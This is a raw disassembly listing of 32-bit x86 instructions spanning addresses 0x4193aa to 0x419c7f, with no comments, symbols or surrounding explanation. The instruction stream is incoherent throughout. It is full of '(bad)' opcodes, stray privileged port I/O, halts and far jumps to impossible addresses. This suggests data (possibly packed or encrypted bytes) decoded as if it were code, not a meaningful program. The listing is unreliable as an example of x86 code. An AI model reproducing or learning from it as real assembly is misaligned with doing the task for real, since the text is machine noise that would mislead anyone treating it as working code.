  4193aa:	adc    eax,0x36
	...
  4193bf:	add    BYTE PTR [eax-0x5a],ah
  4193c2:	dec    eax
  4193c3:	arpl   WORD PTR [edi-0x319cd752],bp
  4193c9:	mov    al,0x16
  4193cb:	test   ax,0xca9
  4193cf:	push   ecx
  4193d0:	push   ecx
  4193d1:	mov    edx,0x90495431
  4193d6:	sub    eax,DWORD PTR [esi+0x7e]
  4193d9:	mov    al,ds:0x98784715
  4193de:	sbb    eax,0xd9b23c00
  4193e3:	cs inc ebx
  4193e5:	mov    dh,0x15
  4193e7:	je     0x41942e
  4193e9:	test   DWORD PTR [eax],ebx
  4193eb:	arpl   WORD PTR [esi-0x63],bx
  4193ee:	sub    DWORD PTR [edi+edx*2-0x60],ebp
  4193f2:	add    DWORD PTR [ecx+0x30],edx
  4193f5:	out    dx,al
  4193f6:	add    al,0x0
  4193f8:	pop    esp
  4193f9:	and    bl,dl
  4193fb:	cs push ebx
  4193fd:	cmp    al,0x6
  4193ff:	je     0x419435
  419401:	loopne 0x41941d
  419403:	je     0x41943a
  419405:	fisubr DWORD PTR [ecx]
  419407:	je     0x41943a
  419409:	sti    
  41940a:	cmp    BYTE PTR [ecx+0x5d],cl
  41940d:	in     al,dx
  41940e:	aaa    
  41940f:	inc    esp
  419410:	fiadd  WORD PTR [edx]
  419412:	xor    eax,0x22fef63
  419417:	jo     0x419419
  419419:	xchg   ebp,eax
  41941a:	fbstp  TBYTE PTR [ebx]
  41941c:	lds    esp,FWORD PTR [ebp+0x66d224d0]
  419422:	test   BYTE PTR [esi],bl
	...
  419438:	mov    ebp,0x8c0f7678
  41943d:	xchg   esp,eax
  41943e:	fild   WORD PTR [ebx]
  419440:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  419447:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  41944e:	fild   WORD PTR [ebx]
  419450:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  419457:	add    ecx,DWORD PTR [esp+edx*4-0x6b73fc21]
  41945e:	xor    dl,BYTE PTR [ebx]
  419460:	mov    al,ds:0xbd1f3b7d
  419465:	mov    edx,0x94701843
  41946a:	xor    dl,BYTE PTR [ebx]
  41946c:	push   0xbd1f137d
  419471:	dec    ebx
  419472:	push   es
  419473:	adc    al,0x6f
  419475:	jp     0x419456
  419477:	adc    BYTE PTR [ebx+0x78],dh
  41947a:	or     BYTE PTR [eax],dl
  41947c:	outs   dx,DWORD PTR ds:[esi]
  41947d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41947e:	and    DWORD PTR cs:[eax+0x7b],esp
  419482:	repnz push ds
  419484:	mov    WORD PTR [edi-0x10],fs
  419487:	pop    ss
  419488:	sub    esp,DWORD PTR [eax+0xc]
  41948b:	rcr    DWORD PTR [eax+0x64],1
  41948e:	rcr    DWORD PTR [esi],1
  419490:	cmp    al,0x75
  419492:	rcr    DWORD PTR [esi],1
  419494:	mov    WORD PTR [edi-0x30],fs
  419497:	pop    ss
  419498:	sub    esp,DWORD PTR [eax-0x34]
  41949b:	rol    BYTE PTR [eax],1
	...
  4194ad:	add    BYTE PTR [eax],al
  4194af:	add    BYTE PTR [eax],bh
  4194b1:	addr16 mov bl,0x1e
  4194b4:	sbb    al,0x94
  4194b6:	mov    dl,0x12
  4194b8:	clc    
  4194b9:	jge    0x4194c3
  4194bb:	mov    ebp,0xca55a5a2
  4194c0:	mov    al,ds:0x99947b78
  4194c5:	dec    ecx
  4194c6:	push   0xffffffa0
  4194c8:	fwait
  4194c9:	ja     0x419544
  4194cb:	jmp    0x80a6104c
  4194d0:	mov    esi,DWORD PTR [edi+0x39]
  4194d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194d4:	lods   al,BYTE PTR ds:[esi]
  4194d5:	jns    0x41953b
  4194d7:	je     0x41947b
  4194d9:	jp     0x419530
  4194db:	mov    ebx,DWORD PTR [ebx-0x70169587]
  4194e1:	jg     0x419548
  4194e3:	arpl   WORD PTR [ebx],di
  4194e5:	jp     0x41954b
  4194e7:	push   eax
  4194e8:	and    al,0x76
  4194ea:	cmp    DWORD PTR [edi],eax
  4194ec:	xor    al,0x7f
  4194ee:	fs jmp 0x50a60f16
  4194f4:	adc    al,0x76
  4194f6:	cmp    DWORD PTR [esi],ebx
  4194f8:	(bad)  
  4194f9:	jp     0x419566
  4194fb:	inc    edi
  4194fc:	mov    BYTE PTR [ebp+0x77],ah
  4194ff:	cmp    eax,0xda6b66e9
  419504:	out    dx,al
  419505:	jae    0x41956b
  419507:	push   cs
  419508:	jecxz  0x41957f
  41950a:	or     BYTE PTR [edx],bl
  41950c:	fnstcw WORD PTR [esi+0x5f]
  41950f:	adc    eax,0xf955a3e5
	...
  419528:	fnstenv [ebp+0x78]
  41952b:	or     dl,al
  41952d:	jne    0x419537
  41952f:	cli    
  419530:	mov    eax,0xa4f55f7e
  419535:	mov    ds:0x75bbda55,eax
  41953a:	js     0x419525
  41953c:	mov    ds:0x9bc06479,al
  419541:	jne    0x41957c
  419543:	scas   al,BYTE PTR es:[edi]
  419544:	mov    dl,0x77
  419546:	fs add al,dl
  419549:	jecxz  0x4195ad
  41954b:	pop    edi
  41954c:	push   edi
  41954d:	jmp    0x9687faca
  419552:	ja     0x4195c5
  419554:	cmp    ecx,edi
  419556:	js     0x4195bd
  419558:	push   esi
  419559:	mul    DWORD PTR [edi+0x6f]
  41955c:	sbb    ebp,ebp
  41955e:	popa   
  41955f:	outs   dx,BYTE PTR ds:[esi]
  419560:	sbb    dh,al
  419562:	pusha  
  419563:	outs   dx,DWORD PTR ds:[esi]
  419564:	pop    es
  419565:	xchg   esi,eax
  419566:	or     BYTE PTR [eax],al
  419568:	gs xchg esi,eax
  41956a:	or     BYTE PTR [eax],al
  41956c:	xor    eax,0x35000896
  419571:	xchg   esi,eax
  419572:	or     BYTE PTR [eax],al
  419574:	and    eax,0x25000896
  419579:	xchg   esi,eax
  41957a:	or     BYTE PTR [eax],al
  41957c:	xor    eax,0x35000896
  419581:	xchg   esi,eax
  419582:	or     BYTE PTR [eax],al
  419584:	and    eax,0x57700896
  419589:	in     eax,0x6a
  41958b:	imul   eax,DWORD PTR [eax],0x0
	...
  41959d:	add    BYTE PTR [eax],al
  41959f:	add    BYTE PTR [ecx-0x5],bl
  4195a2:	ja     0x4195d2
  4195a4:	dec    esp
  4195a5:	out    0x6d,al
  4195a7:	add    BYTE PTR [ebp-0x63999c1e],dl
  4195ad:	in     al,0x69
  4195af:	add    BYTE PTR [ecx+eiz*8-0x10769aaa],bl
  4195b6:	js     0x419621
  4195b8:	cmp    ebx,0xfffffff4
  4195bb:	dec    edi
  4195bc:	test   ah,ch
  4195be:	ins    BYTE PTR es:[edi],dx
  4195bf:	add    BYTE PTR [ebp-0x5e978711],ah
  4195c5:	in     eax,0x49
  4195c7:	js     0x419559
  4195c9:	nop
  4195ca:	js     0x41963e
  4195cc:	sar    bl,0x77
  4195cf:	cs mov edi,0x8c72f4e2
  4195d5:	aam    0xe1
  4195d7:	ins    DWORD PTR es:[edi],dx
  4195d8:	sub    ebp,DWORD PTR [ecx]
  4195da:	(bad)  
  4195db:	sub    eax,0x66e52c1f
  4195e0:	add    cl,dl
  4195e2:	or     BYTE PTR [ecx-0xb],dh
  4195e5:	(bad)  
  4195e7:	ins    BYTE PTR es:[edi],dx
  4195e8:	jmp    0x907:0xf474372e
  4195ef:	jno    0x4195e6
  4195f1:	adc    dh,bh
  4195f3:	ins    BYTE PTR es:[edi],dx
  4195f4:	repnz push cs
  4195f6:	cmp    ebp,DWORD PTR [esi]
  4195f8:	loopne 0x4195fd
  4195fa:	std    
  4195fb:	(bad)  
  4195fc:	fiadd  WORD PTR [edx+eiz*8]
  4195ff:	ins    DWORD PTR es:[edi],dx
  419600:	mov    ebx,0x30fe19
	...
  419615:	add    BYTE PTR [eax],al
  419617:	add    BYTE PTR [edx+0x67],dh
  41961a:	icebp  
  41961b:	jae    0x4195a9
  41961d:	fidivr WORD PTR [edx]
  41961f:	popa   
  419620:	mov    WORD PTR [esi-0x61739bc2],ds
  419626:	arpl   WORD PTR ds:[esi+ebp*4-0x412eb433],cx
  41962e:	rcr    BYTE PTR [edi],1
  419630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419631:	inc    edx
  419632:	sti    
  419633:	jae    0x4196af
  419635:	pop    esp
  419636:	in     eax,0x62
  419638:	mov    al,0x9b
  41963a:	in     eax,dx
  41963b:	ins    DWORD PTR es:[edi],dx
  41963c:	outs   dx,DWORD PTR ds:[esi]
  41963d:	lods   eax,DWORD PTR ds:[esi]
  41963e:	icebp  
  41963f:	outs   dx,DWORD PTR ds:[esi]
  419640:	js     0x4195da
  419642:	loopne 0x419696
  419644:	pop    edi
  419645:	nop
  419646:	(bad)  
  419647:	ins    DWORD PTR es:[edi],dx
  419648:	ins    DWORD PTR es:[edi],dx
  419649:	nop
  41964a:	in     eax,dx
  41964b:	sub    ebp,DWORD PTR [eax+edx*4-0x6ba19f06]
  419652:	cld    
  419653:	jae    0x419686
  419655:	(bad)  
  419656:	fcomp  QWORD PTR [esi+0x3f]
  419659:	out    dx,al
  41965a:	out    dx,eax
  41965b:	ins    BYTE PTR es:[edi],dx
  41965c:	ds (bad) 
  41965e:	sub    al,0x46
  419660:	pop    esi
  419661:	xchg   esp,eax
  419662:	mov    esi,0xc6778bce
  419667:	std    
  419668:	inc    eax
  419669:	js     0x419639
  41966b:	call   0x41410a2
  419670:	dec    edx
  419671:	jnp    0x419624
  419673:	out    0xf1,al
  419675:	ja     0x41963e
  419677:	add    esp,eax
  419679:	pop    ecx
  41967a:	into   
  41967b:	std    
	...
  419690:	bnd js 0x419646
  419693:	loop   0x41966c
  419695:	dec    esi
  419696:	cwde   
  419697:	cmc    
  419698:	out    dx,al
  419699:	outs   dx,BYTE PTR ds:[esi]
  41969a:	xchg   bl,bh
  41969c:	(bad)  
  41969d:	xchg   esp,eax
  41969e:	mov    dl,0xf0
  4196a0:	icebp  
  4196a1:	pusha  
  4196a2:	sahf   
  4196a3:	loop   0x419682
  4196a5:	jno    0x419652
  4196a7:	into   
  4196a8:	mov    eax,0xb7ef986a
  4196ad:	jne    0x41968e
  4196af:	cs addr16 mov ecx,0x64bfe9df
  4196b6:	sub    DWORD PTR [ecx],esi
  4196b8:	jns    0x41964e
  4196ba:	push   edi
  4196bb:	clc    
  4196bc:	lahf   
  4196bd:	sbb    DWORD PTR fs:[ecx],esi
  4196c0:	imul   edx,DWORD PTR [edi+eax*2+0x32649ff8],0xdfb7b93e
  4196cb:	jmp    0x44efb4f
  4196d0:	jb     0x41974f
  4196d2:	xor    edi,esp
  4196d4:	dec    ecx
  4196d5:	inc    eax
  4196d6:	das    
  4196d7:	cmc    
  4196d8:	jb     0x41973a
  4196da:	or     al,0xf5
  4196dc:	mov    cl,0x70
  4196de:	add    al,bh
  4196e0:	fild   DWORD PTR [edx+0xc]
  4196e3:	jecxz  0x41972b
  4196e5:	ja     0x419704
  4196e7:	in     eax,dx
  4196e8:	cs ins DWORD PTR es:[edi],dx
  4196ea:	(bad)  
  4196ec:	push   esi
  4196ed:	ja     0x4196f7
  4196ef:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f1:	jnp    0x419757
  4196f3:	or     BYTE PTR [eax],al
	...
  419705:	add    BYTE PTR [eax],al
  419707:	add    BYTE PTR [esp+eax*2+0x78dac86b],ch
  41970e:	data16 shr BYTE PTR [edx-0x3a16aba2],cl
  419715:	jnp    0x41977c
  419717:	retf   0xe7a0
  41971a:	push   eax
  41971b:	scas   eax,DWORD PTR es:[edi]
  41971c:	jnp    0x419796
  41971e:	imul   edx,edx,0xc67a5563
  419724:	je     0x41978a
  419726:	imul   edi,DWORD PTR [ebx-0x69bc18ad],0x69
  41972d:	outs   dx,BYTE PTR ds:[esi]
  41972e:	lea    ebp,fs:[esi-0x19]
  419732:	push   eax
  419733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419734:	pop    esp
  419735:	ins    DWORD PTR es:[edi],dx
  419736:	pop    edi
  419737:	jge    0x41979c
  419739:	inc    esi
  41973a:	push   esp
  41973b:	cdq    
  41973c:	inc    ecx
  41973d:	js     0x4197ad
  41973f:	nop
  419740:	xor    esi,DWORD PTR [edx+0x79]
  419743:	xchg   ebp,eax
  419744:	pop    DWORD PTR [ebp+0x65]
  419747:	xchg   DWORD PTR [ebx],edi
  419749:	pusha  
  41974a:	addr16 pop ebx
  41974c:	xor    eax,0x3544444b
  419751:	je     0x4197b3
  419753:	das    
  419754:	xor    al,0x57
  419756:	or     BYTE PTR [eax],ch
  419758:	sbb    BYTE PTR [edi+0x4c],dh
  41975b:	push   eax
  41975c:	(bad)  
  41975d:	out    0x40,al
  41975f:	dec    esi
  419760:	out    dx,eax
  419761:	inc    ebp
  419762:	fs sub eax,0x4b0864e9
  419768:	jecxz  0x4197e1
  41976a:	popa   
  41976b:	adc    al,0x0
	...
  41977d:	add    BYTE PTR [eax],al
  41977f:	add    cl,dh
  419781:	fs popa 
  419783:	iret   
  419784:	jmp    0x4197cb
  419786:	jl     0x419771
  419788:	mov    esi,0xc1047c6d
  41978d:	js     0x4197fd
  41978f:	add    BYTE PTR [edx-0x5ab9ba4a],ah
  419795:	nop
  419796:	inc    ebx
  419797:	fs mov esi,?
  41979a:	hlt    
  41979b:	inc    ebp
  41979c:	test   dh,bl
  41979e:	arpl   WORD PTR [edx-0x44],si
  4197a1:	fisubr WORD PTR [ecx+0x73]
  4197a4:	xchg   ebx,eax
  4197a5:	cld    
  4197a6:	push   ebp
  4197a7:	je     0x41974e
  4197a9:	mov    ebp,0xbeeb6e6d
  4197ae:	inc    esp
  4197af:	add    BYTE PTR [esi-0x7],al
  4197b2:	js     0x419819
  4197b4:	inc    esi
  4197b5:	mov    eax,0xd365626c
  4197ba:	inc    eax
  4197bb:	push   ebx
  4197bc:	sub    al,0xce
  4197be:	push   eax
  4197bf:	jnp    0x419805
  4197c1:	mov    eax,ds:0x9f293147
  4197c6:	cmp    al,0x31
  4197c8:	push   eax
  4197c9:	sar    DWORD PTR ds:0x25a52735,1
  4197cf:	xor    DWORD PTR [ecx],ebx
  4197d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197d2:	and    DWORD PTR [eax],edi
  4197d4:	hlt    
  4197d5:	test   eax,0xa1f52d38
  4197da:	xor    BYTE PTR [eax],dh
  4197dc:	in     al,0xcd
  4197de:	inc    esi
  4197df:	xor    eax,DWORD PTR [edi+0x344ace]
	...
  4197f5:	add    BYTE PTR [eax],al
  4197f7:	add    al,al
  4197f9:	hlt    
  4197fa:	dec    ebp
  4197fb:	outs   dx,BYTE PTR ds:[esi]
  4197fc:	push   ebp
  4197fd:	loop   0x419862
  4197ff:	arpl   WORD PTR [esi-0x5],dx
  419802:	jbe    0x41987a
  419804:	pop    eax
  419805:	loop   0x41983e
  419807:	xor    dh,ch
  419809:	loop   0x419874
  41980b:	jb     0x4197c8
  41980d:	sti    
  41980e:	jbe    0x419883
  419810:	repz jmp 0xc6370477
  419816:	dec    edx
  419817:	push   esp
  419818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419819:	int    0x69
  41981b:	je     0x4197a9
  41981d:	xchg   edi,ebx
  41981f:	jno    0x4197ad
  419821:	mov    al,0xd9
  419823:	push   ebx
  419824:	xor    BYTE PTR [ecx-0x63d7d1c6],bl
  41982a:	lock call FWORD PTR [edi+esi*4-0x15]
  41982f:	jae    0x41985e
  419831:	and    eax,0xfb205eed
  419836:	aam    0x42
  419838:	pop    ds
  419839:	mov    edi,0xc7326cf9
  41983e:	aam    0x3e
  419840:	inc    eax
  419841:	sub    eax,0x248c4fdd
  419846:	jecxz  0x4198bb
  419848:	jmp    0xa47b76
  41984d:	pushf  
  41984e:	mov    edi,0xe627fc77
  419853:	jno    0x419846
  419855:	or     DWORD PTR [ecx],ecx
  419857:	push   ebp
  419858:	cmc    
  419859:	adc    eax,0x6de4
	...
  41986e:	add    BYTE PTR [eax],al
  419870:	icebp  
  419871:	pop    es
  419872:	retf   0xef5e
  419875:	adc    esp,eax
  419877:	inc    eax
  419878:	mov    esi,0xb262ed18
  41987d:	pop    edi
  41987e:	in     al,0x5e
  419880:	test   al,0x6a
  419882:	or     DWORD PTR [ebx-0x21],ecx
  419885:	fcmovnb st,st(3)
  419887:	inc    edx
  419888:	ins    BYTE PTR es:[edi],dx
  419889:	mov    ch,0xd0
  41988b:	dec    edi
  41988c:	ins    BYTE PTR es:[edi],dx
  41988d:	stos   DWORD PTR es:[edi],eax
  41988e:	jmp    0xe3883803
  419893:	jno    0x41983d
  419895:	dec    edx
  419896:	or     al,0x44
  419898:	pop    esp
  419899:	mov    esp,0x9bc646dc
  41989e:	or     al,0x40
  4198a0:	inc    esi
  4198a1:	out    0x34,al
  4198a3:	in     al,0x36
  4198a5:	push   es
  4198a6:	sbb    DWORD PTR [ebp-0x56206b97],edi
  4198ac:	mov    WORD PTR [ebx+0x2d],?
  4198af:	outs   dx,BYTE PTR ds:[esi]
  4198b0:	fwait
  4198b1:	pop    edx
  4198b2:	(bad)  
  4198b3:	aas    
  4198b4:	call   0x9552ee2
  4198b9:	fild   QWORD PTR [bx+di+0x7b8c]
  4198be:	sub    eax,0xb65a4e6e
  4198c3:	aas    
  4198c4:	test   al,0x29
  4198c6:	xchg   esi,eax
  4198c7:	adc    ebp,ecx
  4198c9:	data16 fild QWORD PTR [ecx+0x6dad7b8c]
  4198d0:	pop    ecx
  4198d1:	xchg   esp,eax
  4198d2:	fild   WORD PTR [ebx]
	...
  4198e8:	outs   dx,DWORD PTR ds:[esi]
  4198e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198ea:	adc    esp,ebx
  4198ec:	mov    eax,DWORD PTR [edi-0x22]
  4198ef:	in     eax,0xff
  4198f1:	imul   eax,eax,0xfffffff1
  4198f4:	out    dx,al
  4198f5:	inc    eax
  4198f6:	lods   al,BYTE PTR ds:[esi]
  4198f7:	jmp    0x7af8:0xf0b666ec
  4198fe:	xchg   ebx,eax
  4198ff:	(bad)  
  419901:	jb     0x41989e
  419903:	out    0xdd,al
  419905:	jb     0x41988b
  419907:	div    DWORD PTR [ebx+0x59]
  41990a:	xchg   edi,eax
  41990b:	repz mov bh,0x73
  41990e:	jno    0x4198f6
  419910:	mov    ebp,0xbfedb840
  419915:	jns    0x4198a2
  419917:	out    dx,eax
  419918:	stos   BYTE PTR es:[edi],al
  419919:	pop    edx
  41991a:	jbe    0x41990d
  41991c:	mov    dh,0x67
  41991e:	dec    ebx
  41991f:	rcr    DWORD PTR [edi-0x4f1cae8d],1
  419925:	jns    0x419938
  419927:	add    al,0x8c
  419929:	xchg   esp,eax
  41992a:	fild   WORD PTR [ebx]
  41992c:	imul   edx,DWORD PTR [ecx+eax*2-0xe6b90fc],0x3
  419934:	mov    ah,0x94
  419936:	or     bh,bh
  419938:	(bad)  
  419939:	stos   DWORD PTR es:[edi],eax
  41993a:	or     BYTE PTR [edi-0x70],al
  41993d:	scas   eax,DWORD PTR es:[edi]
  41993e:	or     al,ah
  419940:	(bad)  
  419941:	jbe    0x41994b
  419943:	aad    0x8f
  419945:	test   eax,0xa88fc408
  41994a:	or     BYTE PTR [edx],cl
	...
  419960:	nop
  419961:	js     0x41996b
  419963:	ror    BYTE PTR [edi-0x6ff7f751],0xa5
  41996a:	or     BYTE PTR [edi+ecx*4-0x7043f764],bh
  419971:	jne    0x41997b
  419973:	sbb    ecx,DWORD PTR [eax-0x6fdff75a]
  419979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41997a:	or     BYTE PTR ds:0xcb087888,bl
  419980:	pop    DWORD PTR [ebx+0x8]
  419983:	dec    BYTE PTR [edi-0x7009f786]
  419989:	xchg   esp,eax
  41998a:	or     BYTE PTR [esi+eiz*2+0x5cbe7a74],ah
  419991:	jo     0x419a01
  419993:	popf   
  419994:	inc    eax
  419995:	dec    eax
  419996:	pop    edi
  419997:	pop    DWORD PTR [esi+0x71]
  41999a:	imul   ebx,DWORD PTR [ebp-0x78f752d0],0x43
  4199a1:	jae    0x4199d5
  4199a3:	(bad)  
  4199a4:	jo     0x41993a
  4199a6:	pop    ecx
  4199a7:	mov    ?,WORD PTR [ecx]
  4199a9:	addr16 jge 0x419934
  4199ac:	cmp    eax,0x33a85476
  4199b1:	jo     0x419a1d
  4199b3:	dec    esp
  4199b4:	inc    esp
  4199b5:	push   esp
  4199b6:	gs dec esp
  4199b8:	and    eax,0x3ae96670
  4199bd:	jp     0x419a3b
  4199bf:	inc    esp
  4199c0:	jecxz  0x419a37
  4199c2:	jp     0x4199c4
	...
  4199d8:	ret    
  4199d9:	cmc    
  4199da:	jbe    0x419a4f
  4199dc:	in     eax,0xc9
  4199de:	ins    DWORD PTR es:[edi],dx
  4199df:	je     0x419a21
  4199e1:	retf   
  4199e2:	imul   esi,DWORD PTR [edx-0x5d],0xd02076f5
  4199e9:	ret    0x4850
  4199ec:	mov    ch,bl
  4199ee:	js     0x4199f0
  4199f0:	xchg   esi,eax
  4199f1:	icebp  
  4199f2:	js     0x419a59
  4199f4:	xchg   ch,dh
  4199f6:	jbe    0x419a6e
  4199f8:	nop
  4199f9:	jmp    0x655b:0xbc912514
  419a00:	xchg   ebp,eax
  419a02:	jbe    0x419a70
  419a04:	mov    ch,0xc9
  419a06:	ins    DWORD PTR es:[edi],dx
  419a07:	je     0x4199d9
  419a09:	leave  
  419a0a:	imul   esi,DWORD PTR [edx-0x3d],0x802076f3
  419a11:	hlt    
  419a12:	push   eax
  419a13:	push   edx
  419a14:	push   eax
  419a15:	in     eax,dx
  419a16:	arpl   WORD PTR [eax+edx*2-0x4a],si
  419a1a:	dec    esp
  419a1b:	imul   esi,DWORD PTR [edi],0x4a7467f5
  419a21:	call   0xf1479aa3
  419a26:	js     0x419a8d
  419a28:	es cmc 
  419a2a:	jbe    0x419aa2
  419a2c:	adc    al,ch
  419a2e:	adc    al,0x25
  419a30:	add    DWORD PTR [ebp-0x17ef8ca7],ebp
  419a36:	hlt    
  419a37:	push   edx
  419a38:	sbb    al,0xf2
  419a3a:	imul   edx,DWORD PTR [ebx+0x0],0x0
	...
  419a4d:	add    BYTE PTR [eax],al
  419a4f:	add    BYTE PTR [eax],dl
  419a51:	call   0xb5f8ffd0
  419a56:	sub    DWORD PTR [eax+ebp*8-0x3c],esp
  419a5a:	ja     0x419ac1
  419a5c:	(bad)  
  419a5d:	mov    eax,0xb5255758
  419a62:	ja     0x419ac0
  419a64:	mov    WORD PTR [esi+0x536f76e7],?
  419a6a:	jmp    0x419ad2
  419a6c:	jb     0x419a59
  419a6e:	frstor [esi-0x80]
  419a71:	pop    eax
  419a72:	frstor [edx+0x7e]
  419a75:	mov    eax,ds:0x98ac71e7
  419a7a:	call   0xd8f2d9da
  419a7f:	dec    edi
  419a80:	mov    WORD PTR [edi-0x7ca69419],?
  419a86:	out    0x45,eax
  419a88:	pusha  
  419a89:	fwait
  419a8a:	or     al,0x71
  419a8c:	xor    eax,0x6a70e7df
  419a91:	xchg   ebx,eax
  419a92:	fild   QWORD PTR [ebx-0x74]
  419a95:	and    bh,0x61
  419a98:	ins    BYTE PTR es:[edi],dx
  419a99:	mov    bh,0xeb
  419a9b:	jae    0x419aca
  419a9d:	jmp    0x419a6b
  419a9f:	ins    BYTE PTR es:[edi],dx
  419aa0:	xor    eax,esp
  419aa2:	ficomp WORD PTR [edi]
  419aa4:	dec    eax
  419aa5:	int3   
  419aa6:	in     al,0x5e
  419aa8:	mov    WORD PTR [esi],ds
  419aaa:	fmul   QWORD PTR [ebx-0xb]
  419aad:	pop    ds
  419aae:	call   0xfb148cd2
  419ab3:	push   0x0
	...
  419ac5:	add    BYTE PTR [eax],al
  419ac7:	add    ch,ch
  419ac9:	pop    ds
  419aca:	sub    DWORD PTR [ecx],esi
  419acc:	mov    WORD PTR [edi],fs
  419ace:	in     al,dx
  419acf:	popa   
  419ad0:	lock adc BYTE PTR [ecx],cl
  419ad3:	sub    BYTE PTR [esp+eax*8+0x2e8c2008],cl
  419ada:	ret    0xdf4d
  419add:	daa    
  419ade:	fstp   TBYTE PTR [esi]
  419ae0:	aad    0x29
  419ae2:	(bad)  
  419ae5:	std    
  419ae6:	ret    
  419ae7:	dec    edx
  419ae8:	int    0xfd
  419aea:	sar    edi,cl
  419aec:	rol    BYTE PTR [ecx],0xc4
  419aef:	dec    esi
  419af0:	mov    ecx,0xcd042494
  419af5:	dec    esp
  419af6:	sub    al,0xc5
  419af8:	les    edx,FWORD PTR [ebp+eiz*1+0x28575dc9]
  419aff:	rcl    DWORD PTR [ecx-0x6c],0xdf
  419b03:	out    0x68,eax
  419b05:	jns    0x419b5f
  419b07:	jmp    0x7972:0xf64e947c
  419b0e:	dec    eax
  419b0f:	jmp    0x70db:0xe8116740
  419b16:	add    ch,dh
  419b18:	pop    esp
  419b19:	imul   ecx,DWORD PTR [esi],0x1d412ff6
  419b1f:	jecxz  0x419b58
  419b21:	addr16 add al,0x4
  419b24:	aas    
  419b25:	gs or  al,0xf6
  419b28:	and    DWORD PTR [ebx+0xc],esi
  419b2b:	fild   WORD PTR [eax]
	...
  419b3d:	add    BYTE PTR [eax],al
  419b3f:	add    BYTE PTR [eax+0x6a],cl
  419b42:	add    al,ch
  419b44:	push   ds
  419b45:	ja     0x419b26
  419b47:	loope  0x419b68
  419b49:	sub    DWORD PTR fs:[ecx],ebp
  419b4c:	popa   
  419b4d:	xchg   esp,eax
  419b4e:	(bad)  
  419b4f:	out    dx,eax
  419b50:	jmp    DWORD PTR [ecx+ebx*1+0x29]
  419b54:	mov    cl,0x94
  419b56:	xlat   BYTE PTR ds:[ebx]
  419b57:	out    dx,eax
  419b58:	jmp    DWORD PTR [edx+esi*4+0x3d]
  419b5c:	mov    eax,ds:0xd0d7dfaf
  419b61:	outs   dx,DWORD PTR ds:[esi]
  419b62:	mov    dh,0xe0
  419b64:	idiv   DWORD PTR [ecx-0x35]
  419b67:	(bad)  
  419b68:	repz bound eax,QWORD PTR [esi-0x446b111a]
  419b6f:	les    esi,FWORD PTR [ebx-0x5519899e]
  419b75:	imul   ebx,DWORD PTR [ebx+eax*1-0xa68ac28],0x8c0871a0
  419b80:	aas    
  419b81:	ins    BYTE PTR es:[edi],dx
  419b82:	jnp    0x419bfe
  419b84:	pop    DWORD PTR [ebp+0x65]
  419b87:	dec    edi
  419b88:	sbb    al,0x69
  419b8a:	addr16 pop ebx
  419b8c:	xor    edi,DWORD PTR [ecx+ecx*2]
  419b8f:	inc    ecx
  419b90:	add    dh,BYTE PTR [ecx+0x63]
  419b93:	inc    esp
  419b94:	fsubr  DWORD PTR [ebx+0x7b]
  419b97:	cmp    dl,BYTE PTR [eax-0x3c599a9]
  419b9d:	ds fs inc ebp
  419ba0:	lds    edx,FWORD PTR [ebx+0x5f]
  419ba3:	cmp    eax,DWORD PTR [eax]
	...
  419bb5:	add    BYTE PTR [eax],al
  419bb7:	add    BYTE PTR [eax-0x1ae4b5c0],cl
  419bbd:	push   0x5f
  419bbf:	adc    al,0xeb
  419bc1:	fist   WORD PTR [eax+0x27]
  419bc4:	mov    bh,0x74
  419bc6:	pusha  
  419bc7:	sbb    esi,DWORD PTR [ebp-0x1c169496]
  419bcd:	push   esp
  419bce:	gs or  al,0xa5
  419bd1:	jae    0x419c38
  419bd3:	jmp    0xaa6e19b
  419bd8:	mov    cl,0x4a
  419bda:	imul   edx,ebp,0xffffffab
  419bdd:	fild   WORD PTR [ecx+0xc]
  419be0:	retf   
  419be1:	jb     0x419c47
  419be3:	int3   
  419be4:	je     0x419c57
  419be6:	or     BYTE PTR [ebp-0x33bc55b0],ch
  419bec:	jae    0x419c60
  419bee:	gs iret 
  419bf0:	pop    DWORD PTR [eax+0x58]
  419bf3:	mov    ebx,0xbd5f7974
  419bf8:	inc    edx
  419bf9:	or     BYTE PTR fs:[edi+ebx*2+0x3be96976],ch
  419c01:	push   edx
  419c02:	js     0x419b84
  419c04:	xor    BYTE PTR [ebx],bh
  419c06:	dec    ebx
  419c07:	cdq    
  419c08:	ss je  0x419c13
  419c0b:	add    BYTE PTR [esi],dl
  419c0d:	out    dx,eax
  419c0e:	push   ebp
  419c0f:	or     si,WORD PTR [esi-0x6cfaabb2]
  419c16:	ja     0x419c81
  419c18:	cdq    
  419c19:	mov    esi,0x2e77
	...
  419c2e:	add    BYTE PTR [eax],al
  419c30:	mov    esp,0x51006df6
  419c35:	ret    
  419c36:	ins    DWORD PTR es:[edi],dx
  419c37:	je     0x419c91
  419c39:	jecxz  0x419c2f
  419c3b:	pop    ebx
  419c3c:	mov    ebx,0x466977f1
  419c41:	mul    DWORD PTR [ecx+0x20]
  419c44:	mov    al,ds:0x546968f5
  419c49:	cwde   
  419c4a:	es cwd 
  419c4d:	call   0xf426ef46
  419c52:	hlt    
  419c53:	jae    0x419c3a
  419c55:	out    dx,al
  419c56:	hlt    
  419c57:	push   0x66f4f8b5
  419c5c:	mov    ch,0xe1
  419c5e:	hlt    
  419c5f:	jmp    DWORD PTR [ebp-0x7d93b43a]
  419c65:	repnz push ebp
  419c67:	ins    BYTE PTR es:[edi],dx
  419c68:	aad    0x1e
  419c6a:	fs ja  0x419c10
  419c6d:	mul    BYTE PTR [ebx+0x61]
  419c70:	leave  
  419c71:	repz jbe 0x419c74
  419c74:	(bad)  
  419c75:	retf   
  419c76:	and    ah,BYTE PTR [ecx+0x67]
  419c79:	rep ins BYTE PTR es:[edi],dx
  419c7b:	add    BYTE PTR [ebx],ch
  419c7d:	in     al,0x69
  419c7f:	jae    0x419cde
